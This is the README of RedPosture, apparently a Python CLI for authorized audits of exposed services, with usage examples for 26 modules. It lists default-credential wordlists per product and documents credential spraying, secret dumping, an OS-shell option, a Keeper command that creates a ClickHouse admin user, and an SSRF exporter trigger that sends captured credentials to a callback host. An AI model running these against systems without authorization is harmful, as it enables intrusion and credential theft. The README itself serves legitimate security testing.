<p align="center">
  <a href="https://deepwiki.com/MelForze/Redposture"><img src="https://deepwiki.com/badge.svg" alt="Ask DeepWiki"></a>
  <a href="https://github.com/MelForze/Redposture/blob/main/LICENSE"><img src="https://img.shields.io/github/license/MelForze/Redposture?style=flat-square" alt="License"></a>
  <a href="https://github.com/MelForze/Redposture/actions/workflows/ci.yml"><img src="https://img.shields.io/github/actions/workflow/status/MelForze/Redposture/ci.yml?branch=main&style=flat-square&label=CI" alt="CI"></a>
  <a href="https://pypi.org/project/redposture/"><img src="https://img.shields.io/pypi/v/redposture?style=flat-square" alt="PyPI version"></a>
  <img src="https://img.shields.io/badge/audit_modules-26-2b2f36?style=flat-square" alt="26 audit modules">
  <img src="https://img.shields.io/badge/Python-3.12%2B-2b2f36?style=flat-square" alt="Python 3.12+">
</p>

# RedPosture

CLI for authorized audits of exposed services. It identifies products, verifies access, reads available inventory, discovers secrets, and checks a bundled offline CVE catalog. Python 3.12+; 26 audit modules plus `spray` and exporter workflows.

## Install

Install the latest **published** release from [PyPI](https://pypi.org/project/redposture/):

```bash
pipx install redposture
redposture --version
```

For the current repository code, use `python -m venv .venv`, `source .venv/bin/activate`, then `python -m pip install -e .`. A local version change appears on PyPI only after a release is published.

## Usage

Run `redposture MODULE -t TARGET`; `TARGET` can be a host, `host:port`, URL, CIDR/range, comma-separated list, or file. Use `redposture MODULE -h` for flags. `-o FILE` saves output; `-f json` selects JSON instead of TXT. `--debug` shows diagnostics. TXT contains confirmed services; unconfirmed detections remain in debug/JSON. Saved files contain no ANSI colors. `-ot, --out-target` removes matching hosts before ports are expanded; for example, `--out-target exclusions.txt`.

## Default credential checks

`--defcreds` tries product-specific weak candidates only after detection. The table lists the actual candidates; it is not a list of guaranteed factory passwords. The `docker` command supports `--defcreds` only for a confirmed Portainer UI, not Docker Engine.

| Module | Credential pairs checked |
| --- | --- |
| Grafana | `admin:admin`, `admin:changeme`, `admin:grafana`, `admin:password`, `grafana:grafana`, `grafana:password`, `root:password`, `root:root`, `user:password`, `user:user`, `admin:12345678` |
| MinIO | `minioadmin:minioadmin`, `minio:minio123`, `minioadmin:minio123`, `minioadmin:password`, `admin:admin`, `admin:minioadmin`, `admin:password`, `root:minioadmin`, `root:password`, `minio:minio`, `access:secret`, `minioadmin:12345678` |
| Proxmox | `admin@pam:admin`, `admin@pve:admin`, `admin@pve:password`, `root@pam:admin`, `root@pam:changeme`, `root@pam:password`, `root@pam:proxmox`, `root@pam:Proxmox123`, `root@pam:root`, `root@pam:toor`, `root@pam:12345678` |
| Postgres | `admin:admin`, `admin:password`, `admin:postgres`, `dev:dev`, `pgbouncer:pgbouncer`, `pgbouncer_exporter:pgbouncer_exporter`, `pgsql:pgsql`, `postgres:admin`, `postgres:changeme`, `postgres:password`, `postgres:postgres`, `service:service`, `test:test`, `user:password`, `user:user`, `postgres:12345678` |
| MongoDB | `admin:admin`, `admin:changeme`, `admin:mongo`, `admin:mongodb`, `admin:password`, `dev:dev`, `mongo:mongo`, `mongo:password`, `mongodb:mongodb`, `mongodb:password`, `root:admin`, `root:mongo`, `root:mongodb`, `root:password`, `root:root`, `test:test`, `user:password`, `user:user`, `admin:12345678` |
| Oracle | `admin:admin`, `admin:changeme`, `admin:oracle`, `admin:password`, `dbsnmp:dbsnmp`, `dev:dev`, `hr:hr`, `outln:outln`, `pdbadmin:oracle`, `pdbadmin:pdbadmin`, `scott:scott`, `scott:tiger`, `sys:change_on_install`, `sys:oracle`, `sys:sys`, `system:manager`, `system:oracle`, `system:system`, `test:test`, `user:user`, `system:12345678` |
| ClickHouse | `admin:admin`, `admin:changeme`, `admin:password`, `clickhouse:clickhouse`, `clickhouse:password`, `default:<empty>`, `default:changeme`, `default:clickhouse`, `default:default`, `default:password`, `root:password`, `root:root`, `user:password`, `user:user`, `default:12345678` |
| Redis | `admin:admin`, `admin:changeme`, `admin:password`, `default:changeme`, `default:default`, `default:password`, `default:redis`, `dev:dev`, `redis:changeme`, `redis:password`, `redis:redis`, `root:password`, `root:root`, `service:service`, `test:test`, `user:password`, `user:user`, `default:12345678` |
| etcd | `admin:admin`, `admin:changeme`, `admin:etcd`, `admin:password`, `etcd:etcd`, `etcd:password`, `root:admin`, `root:etcd`, `root:password`, `root:root`, `root:rootpass`, `service:service`, `user:password`, `user:user`, `root:12345678` |
| Elastic/OpenSearch | `admin:admin`, `admin:changeme`, `admin:password`, `elastic:changeme`, `elastic:elastic`, `elastic:password`, `kibana:changeme`, `kibana:kibana`, `logstash:logstash`, `logstash_system:changeme`, `opensearch:opensearch`, `opensearch:password`, `admin:12345678`, `elastic:12345678` |
| gRPC | Basic: `admin:admin`, `admin:changeme`, `admin:password`, `dev:dev`, `grpc:admin`, `grpc:grpc`, `grpc:password`, `guest:guest`, `root:admin`, `root:password`, `root:root`, `service:password`, `service:service`, `test:test`, `user:password`, `user:user`, `admin:12345678`.<br>Bearer tokens: `admin`, `changeme`, `default-token`, `grpc`, `secret`, `token`. |
| Kafka | `admin:admin`, `admin:admin-secret`, `admin:changeme`, `admin:kafka`, `admin:password`, `broker:broker`, `broker:brokerpass`, `client:client`, `kafka:admin`, `kafka:changeme`, `kafka:kafka`, `kafka:password`, `kafka:zookeeper`, `service:password`, `service:service`, `user:password`, `user:user`, `admin:12345678` |
| ZooKeeper | `admin:admin`, `admin:changeme`, `admin:kafka`, `admin:password`, `admin:zookeeper`, `broker:broker`, `broker:brokerpass`, `client:client`, `dev:dev`, `guest:guest`, `hadoop:hadoop`, `kafka:changeme`, `kafka:kafka`, `kafka:password`, `kafka:zookeeper`, `root:admin`, `root:password`, `root:root`, `root:rootpass`, `root:zookeeper`, `service:password`, `service:service`, `solr:solr`, `super:super`, `test:test`, `user:password`, `user:user`, `user1:12345`, `zk:password`, `zk:zk`, `zk:zookeeper`, `zookeeper:admin`, `zookeeper:password`, `zookeeper:zookeeper`, `admin:12345678` |
| Keeper | `admin:admin`, `admin:changeme`, `admin:clickhouse`, `admin:keeper`, `admin:password`, `clickhouse:changeme`, `clickhouse:clickhouse`, `clickhouse:keeper`, `clickhouse:password`, `default:<empty>`, `default:changeme`, `default:clickhouse`, `default:default`, `default:password`, `keeper:changeme`, `keeper:clickhouse`, `keeper:keeper`, `keeper:password`, `root:clickhouse`, `root:keeper`, `root:password`, `root:root`, `service:password`, `service:service`, `user:password`, `user:user`, `default:12345678` |
| Airflow | `airflow:airflow`, `admin:admin`, `admin:airflow`, `airflow:admin`, `airflow:password`, `airflow:changeme`, `airflow:airflow123`, `admin:password`, `admin:changeme`, `admin:airflow123`, `root:root`, `root:password`, `user:user`, `user:password`, `test:test`, `dev:dev`, `service:service`, `guest:guest`, `admin:12345678` |
| Jenkins | `admin:admin`, `admin:changeme`, `admin:jenkins`, `admin:password`, `admin:admin123`, `admin:12345678`, `jenkins:jenkins`, `jenkins:password`, `jenkins:changeme`, `jenkins:admin`, `root:root`, `root:password`, `user:user`, `user:password`, `test:test`, `dev:dev`, `guest:guest`, `service:service` |
| GitLab | `root:root`, `root:password`, `root:admin`, `root:changeme`, `root:gitlab`, `root:admin123`, `admin:admin`, `admin:password`, `admin:changeme`, `admin:gitlab`, `gitlab:gitlab`, `gitlab:password`, `gitlab:admin`, `user:user`, `user:password`, `test:test`, `guest:guest`, `dev:dev`, `root:12345678` |
| Harbor | `admin:Harbor12345`, `admin:harbor`, `admin:harbor123`, `admin:Harbor123`, `harbor:harbor`, `harbor:password`, then `admin:admin`, `admin:password`, `admin:changeme`, `admin:admin123`, `admin:123456`, `root:root`, `root:password`, `root:admin`, `root:changeme`, `user:user`, `user:password`, `test:test`, `guest:guest`, `dev:dev`, `service:service`, `admin:12345678` |
| Nexus | `admin:admin123`, `nexus:nexus`, `admin:nexus`, `admin:nexus123`, `admin:sonatype`, `nexus:password`, `nexus:admin`, then `admin:admin`, `admin:password`, `admin:changeme`, `admin:123456`, `root:root`, `root:password`, `root:admin`, `root:changeme`, `user:user`, `user:password`, `test:test`, `guest:guest`, `dev:dev`, `service:service`, `admin:12345678` |
| Docker (Portainer only) | `admin:admin`, `admin:password`, `admin:12345678` |
| Docker Registry | `registry:registry`, `registry:password`, `registry:admin`, `registry:changeme`, `registry:registry123`, `docker:docker`, `docker:password`, then `admin:admin`, `admin:password`, `admin:changeme`, `admin:admin123`, `admin:123456`, `root:root`, `root:password`, `root:admin`, `root:changeme`, `user:user`, `user:password`, `test:test`, `guest:guest`, `dev:dev`, `service:service`, `admin:12345678` |
| KubeAPI | `admin:admin`, `admin:password`, `root:root`, `root:password`, `kubeadmin:kubeadmin`, `kubernetes:kubernetes`, `user:user`, `test:test`, `admin:12345678` |
| RabbitMQ | `admin:admin`, `admin:changeme`, `admin:password`, `admin:rabbitmq`, `guest:guest`, `guest:password`, `rabbitmq:admin`, `rabbitmq:password`, `rabbitmq:rabbitmq`, `root:password`, `root:root`, `service:password`, `service:service`, `test:test`, `user:password`, `user:user`, `admin:12345678` |

For confirmed UI surfaces, `--defcreds` also considers these weak pairs, with
duplicates removed from the module catalog:

| UI | Additional pairs |
| --- | --- |
| mongo-express | `admin:pass`, `admin:admin`, `admin:password` |
| Kibana | `elastic:changeme`, `elastic:elastic`, `kibana:kibana` |
| OpenSearch Dashboards | `admin:admin`, `admin:password` |
| MinIO Console | `minioadmin:minioadmin`, `admin:admin` |
| pgAdmin 4 | `admin@example.com:admin`, `admin@admin.com:admin` |
| Redis Insight | No native UI password. `redis:password`, `admin:admin` apply only if a confirmed reverse proxy Basic challenge protects the UI. |

`consul`, `keycloak`, and `qdrant` have no `--defcreds`; use token/API-key options. KubeAPI tests pairs only if Basic is advertised. ZooKeeper/Keeper need a protected znode: `credentials unverified` does **not** mean a wrong password. Rate limiting or account lock stops further attempts.

## Offline CVE coverage

Every audit command accepts `--enum-cve`, but a confirmed product, suitable version and catalog match are needed for a finding. The bundled catalog contains **210 records** (revision `2026-10-16`):

| Product | CVEs | Product | CVEs |
| --- | ---: | --- | ---: |
| GitLab | 72 | PostgreSQL | 23 |
| Redis | 23 | Airflow | 11 |
| Grafana | 11 | Nexus Repository | 11 |
| MongoDB | 8 | Elasticsearch | 6 |
| Keycloak | 5 | MinIO | 5 |
| Qdrant | 5 | RabbitMQ | 4 |
| ClickHouse | 3 | Valkey | 3 |
| ZooKeeper | 2 | Docker Engine | 2 |
| Harbor | 2 | Jenkins | 2 |
| Oracle Database | 2 | etcd | 1 |
| Grafana Enterprise | 1 | Grafana Image Renderer | 1 |
| Consul | 1 | Jenkins Allure plugin | 1 |
| Jenkins WSO2ID OAuth plugin | 1 | Kubernetes | 1 |
| OpenSearch | 1 | pgAdmin 4 | 1 |
| Proxmox VE | 1 | | |
| **Total** | **210** | | |

Known-version matches mean *potentially affected*, not confirmed exploitability; backports and configuration matter. With an unknown version, catalogued CVEs from the last four years appear as yellow speculative findings. The window uses publication dates or a conservative CVE-year fallback. `PR:L` requires verified anonymous access or explicit credentials, not merely `--defcreds`; elevated-permission entries are omitted when the version is unknown. Some Nexus, Grafana and Keycloak entries have additional prerequisites that version matching does not prove. The catalog focuses on High/Critical network issues other than pure DoS. Generic Docker Registry and gRPC have no product match; Kafka broker lacks an exact release and Keeper has no entries. UI-only targets use their own product/version. JSON includes ranges, fixes, CVSS and references.

## Web UI coverage

These are product-specific HTTP probes, not browser automation. UI login never proves backend credentials.

| Module | Covered web UI / API | Surface |
| --- | --- | --- |
| `airflow` | Airflow webserver/API | Native |
| `docker` | Portainer | Related panel |
| `elastic` | Kibana, OpenSearch Dashboards | Related panels |
| `gitlab` | GitLab web/API and Container Registry | Native |
| `grafana` | Grafana web/API | Native |
| `harbor` | Harbor portal/API | Native |
| `jenkins` | Jenkins web/API | Native |
| `kafka` | Kafbat UI, Provectus Kafka UI, AKHQ, Redpanda Console | Related panels |
| `keycloak` | Realm/OIDC endpoints and token-authorized Admin API | Native web/API |
| `kubeapi` | Kubernetes Dashboard | Related panel |
| `minio` | MinIO Console | Related panel |
| `mongodb` | mongo-express | Related panel |
| `nexus` | Nexus Repository web/API | Native |
| `postgres` | pgAdmin 4, PostgREST | Related UI/API |
| `proxmox` | Proxmox VE web/API | Native |
| `rabbitmq` | RabbitMQ Management UI/API | Native |
| `redis` | Redis Insight | Related panel |

Kafka also detects Kafka REST Proxy, Kafka Connect, ksqlDB and Schema Registry. Unbounded UI `--show-*`/`--dump` writes private JSONL files with resumable checkpoints under `.redposture/ui-exports/`; numeric limits keep output inline. Redis Insight has no native UI password; Basic authentication may belong to a proxy.

## Credential spray

`spray` verifies pairs or tokens only after product detection. `--modules` accepts a comma-separated list or `all`.

```bash
redposture spray -t targets.txt --modules airflow,grafana -u admin -p @passwords.txt -o spray-admin.txt
redposture spray -t targets.txt --modules all --pairs pairs.txt --checkpoint spray.sqlite3 -o spray-pairs.txt
redposture spray -t targets.txt --modules keycloak,kubeapi --tokens tokens.txt -o spray-tokens.txt
```

`-u/-p` accept literals or files (`@file` requires an existing file); `--pairs` splits at the first colon. Defaults: two attempts/s per origin, 60 seconds between attempts for the same account/origin. `--resume` does not repeat completed or interrupted attempts. Results expose supplied secrets; output and checkpoint files use mode `0600`. `--module-config` accepts auth/transport settings only. Docker Engine and Keycloak cannot verify username/password pairs; Portainer can.

## Module examples

Replace example targets and credentials. Add `--defcreds` or `--enum-cve` where supported. Modules with `--discover-max-bytes` default to 50 MiB per target and mark incomplete runs `partial`.

### Airflow

```bash
redposture airflow -t https://airflow.example:8080 -u auditor -p 'password' --show-dags --show-keys --show-connections --discover
redposture airflow -t https://airflow.example:8080 -u auditor -p 'password' --dump
redposture airflow -t https://airflow.example:8080 -u auditor -p 'password' --dump --dag example --key warehouse_password --connection warehouse
```

`--dump` reads DAG source, Variables and Connections; without selectors it reads all three. The default budget is 50 MiB and five minutes per target.

### ClickHouse

```bash
redposture clickhouse -t db.example -u auditor -p 'password' --show-databases --show-tables --discover
```

### Consul

```bash
redposture consul -t http://consul.example:8500 --keys --services --agents
redposture consul -t http://consul.example:8500 --token "$CONSUL_TOKEN" --key app/config --dump
```

### Docker

```bash
redposture docker -t http://docker.example:2375 --containers --images --system
redposture docker -t https://docker.example:2376 --tls-ca ca.pem --tls-cert client.pem --tls-key client.key --containers
```

### Elastic / OpenSearch

```bash
redposture elastic -t https://search.example:9200 -u auditor -p 'password' --show-cluster --show-user --discover
```

### etcd

```bash
redposture etcd -t http://etcd.example:2379 -u root -p 'password' --show-keys 20 --dump 10
```

### GitLab

```bash
redposture gitlab -t https://gitlab.example --token "$GITLAB_TOKEN" --registry-token "$REGISTRY_TOKEN" --show-images
```

`--token` authenticates to GitLab web/API; `--registry-token` authenticates to its Container Registry. SSO, CAPTCHA or rate limiting stops web credential attempts. `registry/2.0` identifies the OCI protocol, not the product version.

### Grafana

```bash
redposture grafana -t https://grafana.example -u auditor -p 'password' --show-datasources
```

### Keycloak

```bash
redposture keycloak -t https://id.example/auth --enum-realms
redposture keycloak -t https://id.example --token-file token.txt --show-realms --show-clients
```

`master` is checked by default; `--enum-realms` tests up to 32 candidate names. A token unlocks Admin API realm/client settings and may reveal the exact version. A generic SSO page or UI theme alone does not identify Keycloak or its version.

### Jenkins

```bash
redposture jenkins -t https://ci.example/jenkins -u auditor --api-token-file token.txt --show-jobs --show-builds 3 --show-plugins --show-nodes --show-queue --show-artifacts 20
```

Jenkins confirms credentials through its identity endpoint. `--show-artifacts` lists names and sizes without downloading content; visibility follows account permissions.

### gRPC

```bash
redposture grpc -t targets.txt --analyze
redposture grpc -t grpc.example --token "$GRPC_TOKEN" --openapi
redposture grpc -t grpc.example --invoke /grpc.health.v1.Health/Check --data '{"service":""}'
```

### Kafka

```bash
redposture kafka -t targets.txt --show-topics
redposture kafka -t kafka.example -u auditor -p 'password' --topic events --dump 10
redposture kafka -t kafka.example -u producer -p 'password' --topic audit.events --write-message 'test event'
redposture kafka -t http://kafka-ui.example:8080 -u auditor -p 'password' --show-clusters --show-topics --show-brokers --show-consumer-groups
```

Kafka UI and broker credentials are verified separately. `--show-topics` without a count lists all visible topics. UI `--dump` without `--topic` reads all visible topics to a resumable file; `--dump N` keeps a bounded inline result. Older Provectus UI versions page by partition offset up to an end-offset snapshot. Incomplete reads are marked `partial`.

`--probe-write` appends an audit marker; `--write-message` or `--write-file` sends one record to `--topic` (binary limit: 1 MiB). A lost acknowledgment is unconfirmed and is never retried automatically.

### Keeper

```bash
redposture keeper -t targets.txt
redposture keeper -t keeper.example -u auditor -p 'password' --show-znodes 20 --dump 10
```

Keeper reports anonymous `ddl access:Write/Read/Denied/Absent/Unknown` for `/clickhouse/task_queue/ddl`. Its default write probe creates and deletes an empty ephemeral znode, **not** a DDL task; `Write` does not prove SQL execution. The probe can trigger watches.

`--show-cluster`/`--show-hosts` read existing DDL tasks. `--create-user` queues a hashed `CREATE USER` and confirms success only after a worker response; `--grant-admin` then queues a separate grant. These operations change ClickHouse accounts:

```bash
redposture keeper -t keeper.example:9181 --create-user audituser --create-userpass 'strong-password' --grant-admin
```

Interactive mode asks for cluster/worker selection and `y` confirmation. `--yes` skips prompts. Without a usable DDL task, set `--clickhouse-cluster` and `--clickhouse-host` (optional `--clickhouse-port`, default 9000); a queue above 512 tasks also needs explicit values. Keeper does not infer ClickHouse hosts from its own address. `{cluster}` expands only if configured in ClickHouse.

### KubeAPI

```bash
redposture kubeapi -t https://cluster.example:6443 --token "$KUBE_TOKEN" --secrets
```

### MinIO

```bash
redposture minio -t https://minio.example:9000 -u minioadmin -p 'password' --show-buckets --show-objects --discover
```

### MongoDB

```bash
redposture mongodb -t mongo.example -u auditor -p 'password' --show-databases --show-collections
```

### Oracle

```bash
redposture oracle -t targets.txt --listener-dump
redposture oracle -t oracle.example --service ORCLPDB1 -u auditor -p 'password' --show-schemas --show-tables --privesc-check
```

Oracle needs the correct service name for database authentication. Its default limit is 8 concurrent targets; `--workers` overrides it.

### PostgreSQL

```bash
redposture postgres -t db.example -u auditor -p 'password' --show-databases --show-tables --privesc-check
```

PostgreSQL and ClickHouse `--os-shell` separate stdout/stderr and preview binary output; `:hex`, `:base64` and `:save` expose captured bytes.

### Proxmox

```bash
redposture proxmox -t https://pve.example:8006 -u auditor@pve -p 'password' --nodes --discover
```

### Qdrant

```bash
redposture qdrant -t http://qdrant.example:6333 --collections
redposture qdrant -t http://qdrant.example:6333 --api-key "$QDRANT_API_KEY" --collection documents --dump 10
```

### RabbitMQ

```bash
redposture rabbitmq -t http://rabbitmq.example:15672 -u auditor -p 'password' --enum
```

### Redis / Valkey

```bash
redposture redis -t redis.example -u auditor -p 'password' --show-keys 20 --dump 10
```

### Harbor

```bash
redposture harbor -t https://harbor.example -u auditor -p 'password' --show-images
```

### Nexus

```bash
redposture nexus -t https://nexus.example -u auditor -p 'password' --show-repositories --show-images --show-assets
redposture nexus -t https://nexus.example -u auditor -p 'password' --asset '/team/app.jar'
```

### Docker Registry

```bash
redposture docker-registry -t https://registry.example -u auditor -p 'password' --show-images
```

`docker-registry` accepts a plain OCI Registry; use `harbor`, `nexus` or `gitlab` for those products. `--show-images` lists Docker images; `nexus --show-repositories` lists Nexus storage repositories. `--show-tags` covers all accessible images unless `--repository NAME` narrows it. `nexus --asset` selects an asset without downloading it. Output follows help order: repositories, images, tags, manifests, metadata, assets, downloads. Protected `/v2/` Basic pairs can be checked even without an auth challenge.

### ZooKeeper

`-u/-p` and `--defcreds` use digest ACL or SASL DIGEST-MD5. A protected znode must confirm access; `credentials unverified` does not prove the password is wrong. Kerberos ticket authentication is separate.

```bash
redposture zookeeper -t zk.example -u auditor -p 'password' --show-znodes 20 --dump 10
```

### Exporters

```bash
redposture exporters scan -t targets.txt
redposture exporters collect -t targets.txt --deep
redposture exporters trigger -t targets.txt --callback-dns callback.example
```

Trigger supports Redis, Postgres, Blackbox, Proxmox, MySQL, JSON, Elasticsearch, SNMP and IPMI. It starts callback listeners; `-e` selects exporters, `-s` selects listeners, and `--profiles-file` or exporter-specific auth-module flags add profiles. `CRED!` requires captured credential material, not merely SSRF. MySQL `mysql_native_password` yields a challenge response, not plaintext; SNMPv3/IPMI do not reveal passwords. `-check` can verify captured Redis/Postgres credentials.

## Development and checks

```bash
git clone https://github.com/MelForze/Redposture.git
cd Redposture
python -m venv .venv
source .venv/bin/activate
python -m pip install -e '.[dev]'
bash scripts/check_before_push.sh --reuse-venvs
```

List local QA sections with `bash scripts/run_full_local_qa.sh --list`, or run all sections with `bash scripts/run_full_local_qa.sh /tmp/redposture_qa_full`.

## License

[MIT](LICENSE).
